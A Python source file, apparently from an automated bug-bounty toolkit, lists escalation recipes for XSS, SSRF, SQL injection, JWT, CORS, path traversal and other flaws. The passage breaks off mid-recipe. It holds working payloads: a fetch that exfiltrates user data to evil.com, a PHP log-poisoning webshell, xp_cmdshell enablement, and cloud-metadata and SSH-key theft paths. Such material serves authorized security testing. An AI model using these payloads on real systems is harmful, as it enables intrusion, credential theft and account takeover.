"""
Impact Amplifier — Post-Finding Escalation Engine

After every confirmed finding, this engine answers the critical question:
"What do I do NEXT to maximize impact?"

Uses curated escalation recipes built from thousands of real HackerOne and
Bugcrowd disclosed reports. For each finding type it returns:
  - Ranked follow-up tests (highest expected payout first)
  - Expected impact boost (Medium → Critical, etc.)
  - Typical bounty range on H1/Bugcrowd
  - Exact tool or HTTP test to perform
  - Chain opportunities with other finding types

Usage:
    from src.sdk.impact_amplifier import get_amplifier

    amplifier = get_amplifier()
    escalations = amplifier.amplify("Reflected XSS", "medium", endpoint="/search", evidence="<script> reflected unencoded")
    pivots      = amplifier.chain_from_findings([finding1, finding2])
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Optional
from loguru import logger


# ─────────────────────────────────────────────────────────────────────────────
# Data structures
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class EscalationStep:
    """A single follow-up test with expected impact."""
    title: str                      # e.g., "Check if XSS triggers on admin view"
    test: str                       # Exact action / HTTP request / tool call
    tool: Optional[str]             # Tool name if applicable
    expected_severity: str          # Critical / High / Medium
    bounty_range: str               # e.g., "$3,000–$10,000"
    probability: float              # 0.0–1.0 likelihood this escalation works
    rationale: str                  # Why this escalation is high-value
    chain_requires: list[str] = field(default_factory=list)  # Other findings needed


@dataclass
class AmplificationResult:
    """Full escalation analysis for one finding."""
    finding_type: str
    original_severity: str
    max_reachable_severity: str
    escalation_steps: list[EscalationStep]
    chain_opportunities: list[dict]
    hunter_note: str                # Elite advice specific to this finding


# ─────────────────────────────────────────────────────────────────────────────
# Escalation Recipes (built from real H1/Bugcrowd disclosed reports)
# Each recipe key is a normalized finding type name or alias.
# ─────────────────────────────────────────────────────────────────────────────

_ESCALATION_RECIPES: dict[str, dict] = {

    # ── XSS ──────────────────────────────────────────────────────────────────
    "reflected_xss": {
        "aliases": ["reflected xss", "xss reflected", "cross-site scripting reflected"],
        "max_severity": "Critical",
        "hunter_note": (
            "Reflected XSS is Medium alone. Your job is to find a victim path. "
            "If an admin visits a URL you control (via email, link, referrer), it's Critical."
        ),
        "steps": [
            EscalationStep(
                title="Check if admin/staff panels render the vulnerable parameter",
                test="GET /admin/search?q=<payload> — if admin visits link you craft → Critical ATO",
                tool="browser_visit",
                expected_severity="Critical",
                bounty_range="$3,000–$15,000",
                probability=0.45,
                rationale="Admin-visible XSS = account takeover without user interaction",
            ),
            EscalationStep(
                title="Verify HttpOnly is absent on session cookie",
                test="curl -I <target> | grep Set-Cookie — if no HttpOnly → cookie theft → ATO chain",
                tool="http_request",
                expected_severity="High",
                bounty_range="$1,000–$5,000",
                probability=0.60,
                rationale="Without HttpOnly, document.cookie gives full session",
            ),
            EscalationStep(
                title="Test if XSS parameter is stored (second-order)",
                test=(
                    "Inject XSS payload into a form field that gets stored (profile name, bio, "
                    "address). Then visit every page that renders that field as a different user."
                ),
                tool="browser_visit",
                expected_severity="High",
                bounty_range="$2,000–$8,000",
                probability=0.35,
                rationale="Stored XSS is auto-reported as Higher severity on all programs",
            ),
            EscalationStep(
                title="Check for CSRF token in page — steal via XSS → CSRF bypass",
                test="document.querySelector('[name=csrf_token]').value — if readable → CSRF-protected action bypass",
                tool="browser_execute_js",
                expected_severity="High",
                bounty_range="$1,500–$6,000",
                probability=0.50,
                rationale="XSS + CSRF = attacker can perform any state-changing action as victim",
            ),
            EscalationStep(
                title="Test postMessage / DOM-based XSS escalation",
                test="Check for window.addEventListener('message') handlers that trust origin — inject via iframe postMessage",
                tool="dom_vulnerability_scanner",
                expected_severity="High",
                bounty_range="$1,000–$4,000",
                probability=0.25,
                rationale="Unvalidated postMessage = cross-origin XSS → no same-origin restriction",
            ),
            EscalationStep(
                title="Trigger XSS in PDF/email export context",
                test=(
                    "If app has PDF export or email templates that render user input, "
                    "inject XSS payload there — Stored XSS in email = wormable"
                ),
                tool="http_request",
                expected_severity="Critical",
                bounty_range="$5,000–$20,000",
                probability=0.20,
                rationale="Email-rendered XSS = no user interaction needed, affects all recipients",
            ),
        ],
    },

    "stored_xss": {
        "aliases": ["stored xss", "persistent xss", "xss stored"],
        "max_severity": "Critical",
        "hunter_note": (
            "Stored XSS is already High. Escalate by proving other users (especially admins) see it, "
            "or that it can steal tokens, modify account data, or is wormable."
        ),
        "steps": [
            EscalationStep(
                title="Prove admin sees the payload — log in as admin, trigger rendering",
                test="Login as admin account → visit page that renders the stored field → confirm XSS fires",
                tool="browser_auth_test",
                expected_severity="Critical",
                bounty_range="$5,000–$20,000",
                probability=0.60,
                rationale="Admin-visible stored XSS = full platform compromise via ATO",
            ),
            EscalationStep(
                title="Test if XSS can access localStorage / sessionStorage tokens",
                test="Payload: localStorage.getItem('token') or sessionStorage — if JWT/token accessible → ATO",
                tool="browser_execute_js",
                expected_severity="Critical",
                bounty_range="$5,000–$20,000",
                probability=0.55,
                rationale="Token theft from storage = persistent ATO even after password change",
            ),
            EscalationStep(
                title="Test wormability — does payload trigger for every user who visits?",
                test=(
                    "Create account A, inject. Create account B, visit same page. "
                    "Does B trigger the payload? If auto-spreading = wormable."
                ),
                tool="browser_auth_test",
                expected_severity="Critical",
                bounty_range="$10,000–$50,000",
                probability=0.15,
                rationale="Wormable XSS can compromise all platform users — Critical at every program",
            ),
            EscalationStep(
                title="Check CSP — bypass it to load external script",
                test=(
                    "Check Content-Security-Policy header. If 'unsafe-inline' or CDN whitelisted "
                    "without integrity → load external script from attacker.com"
                ),
                tool="security_headers_check",
                expected_severity="High",
                bounty_range="$2,000–$8,000",
                probability=0.40,
                rationale="External script load = unlimited payload power even with weak CSP",
            ),
        ],
    },

    # ── SSRF ─────────────────────────────────────────────────────────────────
    "ssrf": {
        "aliases": ["server-side request forgery", "ssrf", "blind ssrf"],
        "max_severity": "Critical",
        "hunter_note": (
            "SSRF alone is Medium. SSRF + cloud metadata = P1 ($10K+). "
            "Always probe 169.254.169.254 (AWS), metadata.google.internal (GCP), "
            "169.254.169.254 (Azure) FIRST before anything else."
        ),
        "steps": [
            EscalationStep(
                title="Probe AWS cloud metadata endpoint",
                test=(
                    "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ "
                    "— if response contains role names → fetch the role → get STS creds"
                ),
                tool="ssrf_cloud_metadata",
                expected_severity="Critical",
                bounty_range="$5,000–$30,000",
                probability=0.55,
                rationale="AWS IMDS gives IAM role credentials → full cloud account access",
            ),
            EscalationStep(
                title="Probe GCP / Azure metadata endpoints",
                test=(
                    "GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token "
                    "Azure: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"
                ),
                tool="ssrf_cloud_metadata",
                expected_severity="Critical",
                bounty_range="$5,000–$30,000",
                probability=0.35,
                rationale="GCP/Azure IMDS tokens give managed identity access to cloud resources",
            ),
            EscalationStep(
                title="IMDSv2 token bypass chain",
                test="PUT http://169.254.169.254/latest/api/token with TTL header → then GET with X-aws-ec2-metadata-token",
                tool="ssrf_imdsv2_chain",
                expected_severity="Critical",
                bounty_range="$8,000–$30,000",
                probability=0.40,
                rationale="IMDSv2 bypass defeats the 'token required' protection on newer AWS instances",
            ),
            EscalationStep(
                title="Scan internal network via SSRF — find Redis, Elasticsearch, Consul",
                test=(
                    "Probe common internal ports: 6379 (Redis), 9200 (Elastic), 8500 (Consul), "
                    "2375 (Docker API), 10250 (Kubernetes). Time differences reveal open/closed."
                ),
                tool="http_request",
                expected_severity="High",
                bounty_range="$3,000–$10,000",
                probability=0.45,
                rationale="Internal Redis without auth = RCE via EVAL command. Docker API = container escape.",
            ),
            EscalationStep(
                title="Use gopher:// to attack internal Redis → RCE",
                test=(
                    "If gopher:// is not blocked: gopher://redis-host:6379/_*1%0d%0a... "
                    "to write SSH authorized_keys or cron job → RCE on internal host"
                ),
                tool="http_request",
                expected_severity="Critical",
                bounty_range="$10,000–$50,000",
                probability=0.25,
                rationale="Gopher SSRF + Redis SSRF = blind RCE through Redis AUTH bypass",
            ),
            EscalationStep(
                title="DNS rebinding attack for blind SSRF confirmation",
                test=(
                    "Register a domain that resolves to 1.2.3.4 first (bypass checks), "
                    "then rebinds to 169.254.169.254 on second resolution"
                ),
                tool="http_request",
                expected_severity="High",
                bounty_range="$3,000–$10,000",
                probability=0.20,
                rationale="DNS rebinding bypasses IP blocklists by changing resolution between validation and request",
            ),
        ],
    },

    # ── SQL Injection ─────────────────────────────────────────────────────────
    "sql_injection": {
        "aliases": ["sqli", "sql injection", "sql_injection", "blind sqli", "time-based sqli"],
        "max_severity": "Critical",
        "hunter_note": (
            "SQLi is Critical but reports get accepted faster with DATA EXTRACTION proof. "
            "Extract the first row of users table or show DB version as PoC. "
            "Check if xp_cmdshell (MSSQL) or INTO OUTFILE (MySQL) → RCE."
        ),
        "steps": [
            EscalationStep(
                title="Extract database version and user table as PoC",
                test="sqlmap --dump -T users --start=1 --stop=3 — extract first 3 user rows with hashed passwords",
                tool="sqlmap_attack",
                expected_severity="Critical",
                bounty_range="$5,000–$20,000",
                probability=0.80,
                rationale="Data extraction proof = undeniable impact, programs pay top bounty",
            ),
            EscalationStep(
                title="Check for FILE privilege → read /etc/passwd → write webshell",
                test=(
                    "UNION SELECT LOAD_FILE('/etc/passwd') — if content returned, "
                    "try SELECT 'shell' INTO OUTFILE '/var/www/html/shell.php'"
                ),
                tool="sqli_extract_blind",
                expected_severity="Critical",
                bounty_range="$8,000–$30,000",
                probability=0.30,
                rationale="MySQL FILE privilege = LFI → webshell → RCE from SQLi",
            ),
            EscalationStep(
                title="MSSQL: enable xp_cmdshell for OS command execution",
                test=(
                    "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; "
                    "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--"
                ),
                tool="sqlmap_attack",
                expected_severity="Critical",
                bounty_range="$10,000–$40,000",
                probability=0.25,
                rationale="xp_cmdshell on MSSQL = direct OS RCE with SQL Server service privileges",
            ),
            EscalationStep(
                title="ORDER BY injection bypass for WAF-protected endpoints",
                test=(
                    "Add 'ORDER BY (CASE WHEN 1=1 THEN name ELSE id END)' — bypasses WAF "
                    "that blocks UNION/SELECT. Test order change = blind boolean confirmation."
                ),
                tool="http_request",
                expected_severity="High",
                bounty_range="$3,000–$10,000",
                probability=0.50,
                rationale="ORDER BY injection is the most underused WAF bypass technique in bug bounty",
            ),
            EscalationStep(
                title="Second-order SQLi — inject into stored field, trigger via different function",
                test=(
                    "Register with username: admin'-- "
                    "Then trigger password change, account delete, or search that uses stored username. "
                    "The stored value is used unsafely in a second query."
                ),
                tool="http_request",
                expected_severity="Critical",
                bounty_range="$5,000–$20,000",
                probability=0.30,
                rationale="Second-order SQLi bypasses parameterized queries in the input phase but not in usage",
            ),
        ],
    },

    # ── IDOR / BOLA ──────────────────────────────────────────────────────────
    "idor": {
        "aliases": ["idor", "bola", "broken object level authorization", "insecure direct object reference"],
        "max_severity": "Critical",
        "hunter_note": (
            "IDOR on read = Medium. IDOR on write/delete = High. IDOR on admin objects = Critical. "
            "Always test: can you WRITE (not just read) to someone else's object? "
            "Can you enumerate ALL objects? (mass data exfiltration = Critical)"
        ),
        "steps": [
            EscalationStep(
                title="Escalate read IDOR to write IDOR — modify other user's data",
                test=(
                    "PUT /api/users/{victim_id}/profile with your auth token. "
                    "Try changing email, password, role. Even partial write = High."
                ),
                tool="rest_api_fuzzing",
                expected_severity="High",
                bounty_range="$2,000–$8,000",
                probability=0.55,
                rationale="Write IDOR is account takeover — changing email = full ATO",
            ),
            EscalationStep(
                title="Mass enumeration — prove full data exfiltration impact",
                test=(
                    "Enumerate IDs 1–1000 via idor_enumerate. If you can read all user PII "
                    "in bulk → Critical (GDPR violation, $10K+ programs)"
                ),
                tool="idor_enumerate",
                expected_severity="Critical",
                bounty_range="$5,000–$25,000",
                probability=0.65,
                rationale="Mass PII exfiltration = Critical at every program, GDPR reporting required",
            ),
            EscalationStep(
                title="Test UUID predictability — are 'random' IDs actually sequential or timestamp-based?",
                test=(
                    "Collect 5 UUIDs from different accounts. Check if they are v1 (time-based), "
                    "sequential, or share a common prefix. UUIDv1 is predictable from timestamp."
                ),
                tool="http_request",
                expected_severity="High",
                bounty_range="$2,000–$8,000",
                probability=0.30,
                rationale="Predictable 'random' IDs make IDOR scalable to all users — higher impact",
            ),
            EscalationStep(
                title="Cross-tenant IDOR — access another organization's data in multi-tenant SaaS",
                test=(
                    "Create two accounts in different orgs. Try accessing org1 resources with org2 token. "
                    "Try /api/orgs/{other_org_id}/members, /projects, /billing"
                ),
                tool="two_account_authz_engine",
                expected_severity="Critical",
                bounty_range="$8,000–$30,000",
                probability=0.45,
                rationale="Cross-tenant data access = Critical at every SaaS program, affects all customers",
            ),
            EscalationStep(
                title="IDOR + mass assignment — add role/admin field when modifying your own object",
                test=(
                    "PUT /api/users/{your_id} with body: {name: 'test', role: 'admin', is_admin: true}. "
                    "Check if extra fields are silently accepted."
                ),
                tool="http_request",
                expected_severity="Critical",
                bounty_range="$5,000–$20,000",
                probability=0.40,
                rationale="Mass assignment + IDOR = privilege escalation to admin without IDOR on admin endpoint",
            ),
            EscalationStep(
                title="IDOR on financial objects — transactions, invoices, payment methods",
                test=(
                    "Try accessing /api/invoices/{id}, /transactions/{id}, /payment-methods/{id}. "
                    "Financial data disclosure is Critical at fintech programs ($15K+)"
                ),
                tool="rest_api_fuzzing",
                expected_severity="Critical",
                bounty_range="$5,000–$30,000",
                probability=0.35,
                rationale="Financial data IDOR triggers regulatory reporting in addition to program bounty",
            ),
        ],
    },

    # ── Open Redirect ─────────────────────────────────────────────────────────
    "open_redirect": {
        "aliases": ["open redirect", "open_redirect", "unvalidated redirect"],
        "max_severity": "Critical",
        "hunter_note": (
            "Open redirect is Low alone. Its value is ALWAYS as a chain component. "
            "First question: is there OAuth/SSO? Second: is there a password reset? "
            "Either answer = potential Critical."
        ),
        "steps": [
            EscalationStep(
                title="Chain with OAuth — steal authorization code via redirect_uri bypass",
                test=(
                    "If app uses OAuth: craft /oauth/authorize?redirect_uri=https://vulnerable.com/redirect?url=//evil.com "
                    "The auth code lands on evil.com via Referer or redirect chain."
                ),
                tool="oauth_flow_test",
                expected_severity="Critical",
                bounty_range="$5,000–$20,000",
                probability=0.45,
                rationale="OAuth code theft via open redirect = full account takeover without any user password",
            ),
            EscalationStep(
                title="Password reset poisoning — Host header injection in reset email",
                test=(
                    "POST /forgot-password with Host: evil.com header. "
                    "If reset link in email uses Host header → token sent to evil.com"
                ),
                tool="password_reset_tester",
                expected_severity="Critical",
                bounty_range="$5,000–$15,000",
                probability=0.40,
                rationale="Password reset host injection = ATO for any account — Critical at all programs",
            ),
            EscalationStep(
                title="Token leakage via Referer header from redirect",
                test=(
                    "If reset page loads Google Analytics/FB pixel: reset_token is in URL, "
                    "redirect sends it in Referer to external domain. Check network requests."
                ),
                tool="browser_visit",
                expected_severity="High",
                bounty_range="$3,000–$10,000",
                probability=0.30,
                rationale="Referer-based token leakage is a Critical ATO vector that most scanners miss",
            ),
            EscalationStep(
                title="SSRF via open redirect — bypass SSRF URL validator with redirect",
                test=(
                    "SSRF validator allows your domain. Your domain redirects to 169.254.169.254. "
                    "Send: ssrf_param=https://your-redirect-domain.com → follows redirect to IMDS"
                ),
                tool="ssrf_scanner",
                expected_severity="Critical",
                bounty_range="$5,000–$20,000",
                probability=0.25,
                rationale="Redirect-chained SSRF bypasses allowlist-based SSRF mitigations completely",
            ),
        ],
    },

    # ── JWT ──────────────────────────────────────────────────────────────────
    "jwt": {
        "aliases": ["jwt", "json web token", "jwt attack", "jwt confusion", "jwt forgery"],
        "max_severity": "Critical",
        "hunter_note": (
            "JWT issues are often Critical because they mean auth bypass. "
            "Test all 4 classic attacks: alg:none, RS256→HS256 confusion, "
            "weak secret brute force, and kid path traversal."
        ),
        "steps": [
            EscalationStep(
                title="alg:none — server accepts unsigned token",
                test=(
                    "Modify JWT header: {alg: 'none'}, remove signature. "
                    "Change sub/role claim to admin. Send to authenticated endpoint."
                ),
                tool="jwt_forge",
                expected_severity="Critical",
                bounty_range="$5,000–$20,000",
                probability=0.30,
                rationale="alg:none acceptance = complete auth bypass, access any account",
            ),
            EscalationStep(
                title="RS256 → HS256 algorithm confusion using public key as secret",
                test=(
                    "Extract public key from /jwks.json or /.well-known/jwks.json. "
                    "Sign token with HMAC-SHA256 using public key as secret. Change alg to HS256."
                ),
                tool="jwt_embedded_jwk",
                expected_severity="Critical",
                bounty_range="$5,000–$25,000",
                probability=0.35,
                rationale="Algorithm confusion bypasses RSA verification by making server use public key as HMAC secret",
            ),
            EscalationStep(
                title="Brute force weak JWT secret — check hashcat top-1000 secrets",
                test=(
                    "jwt-cracker / hashcat mode 16500 with rockyou.txt. "
                    "If secret found: forge arbitrary claims (admin, privilege escalation)"
                ),
                tool="jwt_analysis",
                expected_severity="Critical",
                bounty_range="$5,000–$15,000",
                probability=0.20,
                rationale="Common secrets like 'secret', 'password', app name = trivial forge of any token",
            ),
            EscalationStep(
                title="jku/x5u header injection — point to attacker-controlled JWKS",
                test=(
                    "Add jku: https://attacker.com/jwks.json to JWT header. "
                    "Host a JWKS with your own RSA key. Sign token with your private key."
                ),
                tool="jwt_jku_attack",
                expected_severity="Critical",
                bounty_range="$5,000–$20,000",
                probability=0.25,
                rationale="JWKS URL injection = full control over key validation → arbitrary token forgery",
            ),
            EscalationStep(
                title="kid parameter path traversal — use /dev/null or known file as key",
                test=(
                    "Set kid: ../../dev/null and sign with empty string. "
                    "Or set kid: /etc/passwd and sign with known file content."
                ),
                tool="jwt_kid_path_traversal",
                expected_severity="Critical",
                bounty_range="$5,000–$20,000",
                probability=0.20,
                rationale="kid path traversal makes any known file the signing secret — predictable null key",
            ),
        ],
    },

    # ── CORS ─────────────────────────────────────────────────────────────────
    "cors": {
        "aliases": ["cors", "cors misconfiguration", "cross-origin resource sharing"],
        "max_severity": "High",
        "hunter_note": (
            "CORS alone is Low/Medium. The key question: does the endpoint return "
            "sensitive data AND does it reflect arbitrary Origin with credentials? "
            "If yes → High. If it's the auth/token endpoint → Critical."
        ),
        "steps": [
            EscalationStep(
                title="Verify credentials=true is set — required for cookie/auth theft",
                test=(
                    "curl -H 'Origin: https://evil.com' -H 'Cookie: session=...' /api/profile "
                    "Check: Access-Control-Allow-Credentials: true AND Access-Control-Allow-Origin: https://evil.com"
                ),
                tool="cors_check",
                expected_severity="High",
                bounty_range="$1,500–$5,000",
                probability=0.70,
                rationale="Without credentials:true, CORS cannot steal cookies — credentials is required for impact",
            ),
            EscalationStep(
                title="Test CORS on auth/token endpoints specifically",
                test=(
                    "Try cors_check on /api/auth/me, /api/token/refresh, /api/user/session. "
                    "If these reflect arbitrary origin → auth token theft → ATO"
                ),
                tool="cors_check",
                expected_severity="Critical",
                bounty_range="$3,000–$10,000",
                probability=0.40,
                rationale="CORS on token refresh endpoint = steal tokens for all active users silently",
            ),
            EscalationStep(
                title="Test null origin bypass — some apps allow null origin from sandboxed iframes",
                test=(
                    "curl -H 'Origin: null' /api/profile — if returns Access-Control-Allow-Origin: null "
                    "→ sandbox iframe can access this from any attacker page"
                ),
                tool="http_request",
                expected_severity="High",
                bounty_range="$1,500–$5,000",
                probability=0.25,
                rationale="null origin allows sandboxed iframe attacks — many validators forget null check",
            ),
            EscalationStep(
                title="Write PoC HTML page that silently steals data",
                test=(
                    "Create: fetch('https://target.com/api/user', {credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://evil.com?d='+JSON.stringify(d))) "
                    "Host on your domain — send link to victim"
                ),
                tool=None,
                expected_severity="High",
                bounty_range="$2,000–$8,000",
                probability=0.85,
                rationale="Working PoC page proves exploitability and maximizes bounty award",
            ),
        ],
    },

    # ── Race Condition ────────────────────────────────────────────────────────
    "race_condition": {
        "aliases": ["race condition", "toctou", "time of check", "concurrent request"],
        "max_severity": "Critical",
        "hunter_note": (
            "Race conditions on payments/transfers are Critical ($10K+). "
            "Use H2 single-packet attack for maximum concurrency. "
            "The PoC must SHOW the money: duplicate withdrawal, free upgrade, etc."
        ),
        "steps": [
            EscalationStep(
                title="Payment/transfer double-spend — send 20 concurrent requests",
                test=(
                    "Use http2_single_packet_race with 20 copies of the payment/transfer request. "
                    "Check if balance goes negative or transfer exceeds available funds."
                ),
                tool="http2_single_packet_race",
                expected_severity="Critical",
                bounty_range="$5,000–$30,000",
                probability=0.50,
                rationale="Double spend on financial transactions = direct financial loss to the company",
            ),
            EscalationStep(
                title="Coupon/promo code unlimited redemption",
                test=(
                    "Apply same coupon code 20 times concurrently. "
                    "If discount applies more than once → Critical business logic bypass"
                ),
                tool="http2_single_packet_race",
                expected_severity="High",
                bounty_range="$2,000–$8,000",
                probability=0.60,
                rationale="Coupon race = financial loss at scale if automated. Easy to prove impact.",
            ),
            EscalationStep(
                title="Account registration race — bypass unique email constraint",
                test=(
                    "Register with same email 10 times simultaneously. "
                    "If multiple accounts created → duplicate account hijack possible"
                ),
                tool="http2_single_packet_race",
                expected_severity="High",
                bounty_range="$2,000–$6,000",
                probability=0.40,
                rationale="Duplicate accounts defeat 2FA, ownership verification, and KYC controls",
            ),
            EscalationStep(
                title="Free plan upgrade — race between plan check and service provisioning",
                test=(
                    "Send 20 concurrent upgrade requests for a paid feature while on free plan. "
                    "If feature activates without payment → Critical business logic"
                ),
                tool="http2_single_packet_race",
                expected_severity="Critical",
                bounty_range="$3,000–$15,000",
                probability=0.35,
                rationale="Free access to paid features at scale = direct revenue loss for SaaS companies",
            ),
        ],
    },

    # ── Path Traversal / LFI ──────────────────────────────────────────────────
    "path_traversal": {
        "aliases": ["path traversal", "lfi", "local file inclusion", "directory traversal", "file inclusion"],
        "max_severity": "Critical",
        "hunter_note": (
            "Path traversal to /etc/passwd is Medium proof. Escalate by reading: "
            "app config files (db creds), .env (API keys), SSH private keys (/root/.ssh/id_rsa). "
            "Any credential = Critical. Log poisoning → RCE = Critical."
        ),
        "steps": [
            EscalationStep(
                title="Read application config files — DB credentials, secret keys",
                test=(
                    "../../config/database.yml, ../../.env, ../../config/secrets.yml, "
                    "../../wp-config.php, ../../config/config.php — database credentials = Critical"
                ),
                tool="path_traversal_scanner",
                expected_severity="Critical",
                bounty_range="$3,000–$15,000",
                probability=0.55,
                rationale="DB credentials from LFI = full database dump = Critical impact",
            ),
            EscalationStep(
                title="Read SSH private keys",
                test=(
                    "../../root/.ssh/id_rsa, ../../home/ubuntu/.ssh/id_rsa, ../../home/www-data/.ssh/id_rsa "
                    "If returned → can SSH to server directly"
                ),
                tool="path_traversal_scanner",
                expected_severity="Critical",
                bounty_range="$5,000–$20,000",
                probability=0.30,
                rationale="SSH private key = direct server access regardless of CVE/service exploitation",
            ),
            EscalationStep(
                title="Log poisoning → RCE via PHP include",
                test=(
                    "1. Send: GET /<?php system($_GET['cmd']); ?> HTTP/1.1 — Apache logs this in access.log "
                    "2. LFI: ?file=../../var/log/apache2/access.log&cmd=id "
                    "3. If PHP executed → RCE"
                ),
                tool="http_request",
                expected_severity="Critical",
                bounty_range="$8,000–$30,000",
                probability=0.25,
                rationale="Log poisoning converts LFI to RCE — the highest-impact escalation path",
            ),
            EscalationStep(
                title="Read /proc/self/environ — environment variables with secrets",
                test=(
                    "../../proc/self/environ — returns process environment variables. "
                    "Often contains: DATABASE_URL, SECRET_KEY, AWS_ACCESS_KEY_ID, API_KEY"
                ),
                tool="path_traversal_scanner",
                expected_severity="Critical",
                bounty_range="$3,000–$15,000",
                probability=0.40,
                rationale="/proc/self/environ dumps all environment secrets without needing config file location",
            ),
        ],
    },

    # ── Business Logic ────────────────────────────────────────────────────────
    "business_logic": {
        "aliases": ["business logic", "price manipulation", "payment bypass", "workflow bypass", "negative price"],
        "max_severity": "Critical",
        "hunter_note": (
            "Business logic bugs are the most underreported and highest-paid. "
            "Programs LOVE these because automated scanners miss them entirely. "
            "Always test: negative quantities, zero price, currency manipulation, quantity overflow."
        ),
        "steps": [
            EscalationStep(
                title="Negative quantity / price → get money back while receiving item",
                test=(
                    "Intercept checkout request. Change: quantity=-1, amount=-100. "
                    "Does the order go through? Does balance increase? → Critical"
                ),
                tool="http_request",
                expected_severity="Critical",
                bounty_range="$5,000–$20,000",
                probability=0.40,
                rationale="Negative quantity exploit = attackers profit instead of pay — direct financial loss",
            ),
            EscalationStep(
                title="Currency arbitrage — change EUR to USD without recalculation",
                test=(
                    "Intercept payment request. Change currency: EUR → USD (or lower-value currency). "
                    "If price stays the same → pay fraction of intended amount"
                ),
                tool="http_request",
                expected_severity="High",
                bounty_range="$2,000–$8,000",
                probability=0.35,
                rationale="Currency manipulation allows purchasing at a fraction of the real price",
            ),
            EscalationStep(
                title="Plan_id / tier manipulation — change to higher tier without paying",
                test=(
                    "Intercept upgrade request. Change plan_id from 'free' to 'enterprise'. "
                    "Does the server activate enterprise features? → Critical"
                ),
                tool="http_request",
                expected_severity="Critical",
                bounty_range="$3,000–$15,000",
                probability=0.45,
                rationale="Plan ID bypass = unlimited free access to paid features — direct SaaS revenue loss",
            ),
            EscalationStep(
                title="Apply expired/used discount codes via race condition or replay",
                test=(
                    "Save the payment request with a valid coupon. After using it, replay the same request. "
                    "Does the coupon work again? Try with expired coupon from Wayback Machine"
                ),
                tool="http2_single_packet_race",
                expected_severity="High",
                bounty_range="$2,000–$8,000",
                probability=0.30,
                rationale="Replayable coupons = unlimited discount abuse at scale",
            ),
        ],
    },

    # ── HTTP Smuggling ────────────────────────────────────────────────────────
    "http_smuggling": {
        "aliases": ["http smuggling", "request smuggling", "http request smuggling", "te.cl", "cl.te"],
        "max_severity": "Critical",
        "hunter_note": (
            "HTTP smuggling is rare and always Critical/High. If you find it, "
            "prove impact by: (1) poisoning the next user's request, "
            "(2) bypassing WAF to access blocked endpoints, "
            "(3) stealing other users' cookies/headers."
        ),
        "steps": [
            EscalationStep(
                title="Poison the next user's request — steal their session",
                test=(
                    "Craft a smuggled request that prepends your controlled prefix to the next user's request. "
                    "If you can capture their Cookie or Authorization header → Critical ATO"
                ),
                tool="smuggling_cl0",
                expected_severity="Critical",
                bounty_range="$8,000–$40,000",
                probability=0.40,
                rationale="Session theft via smuggling = persistent ATO without phishing or XSS",
            ),
            EscalationStep(
                title="WAF bypass via smuggling — access blocked admin endpoints",
                test=(
                    "Smuggle a GET /admin request inside a POST to a public endpoint. "
                    "The backend sees /admin while the WAF only saw /public."
                ),
                tool="smuggling_te0",
                expected_severity="Critical",
                bounty_range="$5,000–$20,000",
                probability=0.35,
                rationale="WAF bypass via smuggling = access to any blocked endpoint including /admin",
            ),
            EscalationStep(
                title="Cache poisoning via smuggled response",
                test=(
                    "Smuggle a response that poisons the cache with attacker-controlled content. "
                    "Next user who requests the same URL gets your malicious content → stored XSS equivalent"
                ),
                tool="smuggling_h2_downgrade",
                expected_severity="Critical",
                bounty_range="$5,000–$20,000",
                probability=0.25,
                rationale="Cache-poisoned smuggling = persistent XSS affecting all users without stored payload",
            ),
        ],
    },

    # ── Mass Assignment ───────────────────────────────────────────────────────
    "mass_assignment": {
        "aliases": ["mass assignment", "parameter pollution", "auto binding", "over posting"],
        "max_severity": "Critical",
        "hunter_note": (
            "Mass assignment is High/Critical when role fields are accepted. "
            "Always add: role, is_admin, admin, premium, verified, confirmed fields to every PUT/POST body."
        ),
        "steps": [
            EscalationStep(
                title="Add role=admin / is_admin=true to account creation or profile update",
                test=(
                    "POST /api/register: {email, password, role: 'admin', is_admin: true, admin: 1} "
                    "Or PUT /api/profile: {name, role: 'superadmin', permissions: ['*']}"
                ),
                tool="http_request",
                expected_severity="Critical",
                bounty_range="$3,000–$15,000",
                probability=0.35,
                rationale="Admin role self-assignment = full platform compromise via one API call",
            ),
            EscalationStep(
                title="Add premium=true / subscription_status=active without payment",
                test=(
                    "POST /api/users with {email, password, premium: true, plan: 'enterprise', trial: false} "
                    "Check if premium features are activated after registration"
                ),
                tool="http_request",
                expected_severity="High",
                bounty_range="$2,000–$8,000",
                probability=0.40,
                rationale="Free premium access via mass assignment = revenue loss at scale",
            ),
            EscalationStep(
                title="Add verified=true / email_verified=true to bypass email verification",
                test=(
                    "POST /api/register: {email, password, email_verified: true, verified: 1} "
                    "If verification is bypassed → register with victim email without owning it"
                ),
                tool="http_request",
                expected_severity="High",
                bounty_range="$2,000–$6,000",
                probability=0.30,
                rationale="Email verification bypass via mass assignment = pre-account-takeover for any email",
            ),
        ],
    },

    # ── Subdomain Takeover ────────────────────────────────────────────────────
    "subdomain_takeover": {
        "aliases": ["subdomain takeover", "dangling dns", "cname takeover"],
        "max_severity": "Critical",
        "hunter_note": (
            "Subdomain takeover alone is High. Escalate by: "
            "(1) serving malicious JS to steal cookies via domain scope, "
            "(2) issuing a TLS certificate to appear legitimate, "
            "(3) OAuth redirect_uri bypass if the subdomain is whitelisted."
        ),
        "steps": [
            EscalationStep(
                title="Claim the expired service the CNAME points to",
                test=(
                    "Identify the service (Heroku, GitHub Pages, S3, Netlify, etc.) "
                    "Register the same app/bucket name on that service → you now control the subdomain"
                ),
                tool="http_request",
                expected_severity="High",
                bounty_range="$2,000–$8,000",
                probability=0.70,
                rationale="Claiming the service is the exploitation step — all further impact follows from it",
            ),
            EscalationStep(
                title="Check if session cookies are scoped to parent domain — steal via XSS on subdomain",
                test=(
                    "Check Set-Cookie header of main app: domain=.example.com? "
                    "If yes, JS on sub.example.com (now controlled) can read document.cookie"
                ),
                tool="http_request",
                expected_severity="Critical",
                bounty_range="$5,000–$20,000",
                probability=0.50,
                rationale="Broad cookie scope + subdomain takeover = JS on your page reads main app session",
            ),
            EscalationStep(
                title="OAuth redirect_uri bypass — subdomain in whitelist allows token theft",
                test=(
                    "If OAuth allows redirect_uri matching *.example.com and you own sub.example.com → "
